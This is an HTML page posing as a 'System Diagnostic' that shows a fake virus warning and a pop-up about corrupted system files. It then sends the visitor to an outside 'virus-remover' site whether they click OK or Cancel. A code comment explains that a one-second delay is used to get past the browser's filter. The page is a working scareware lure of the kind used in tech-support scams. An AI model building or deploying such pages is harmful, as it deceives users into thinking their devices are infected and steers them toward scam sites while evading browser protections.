<!DOCTYPE html>
<html>
<head>
    <title>System Diagnostic</title>
</head>
<body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 20%;">

    <h1 id="status-text">A virus has been detected on this device. Connecting to diagnostic server</h1>

    <script>
        // Using a tiny delay (1 second) prevents the browser filter from blocking the code on load
        setTimeout(function() {
            alert("CRITICAL WARNING: System files corrupted. Redirecting to repair tool");
            
            if (confirm("Click OK to proceed to secure server")) {
                window.location.href = "https://virus-remover.base44.app";
            } else {
                // If they click cancel, it forces the redirect anyway
                window.location.href = "https://base44.app";
            }
        }, 1000); 
    </script>

</body>
</html>
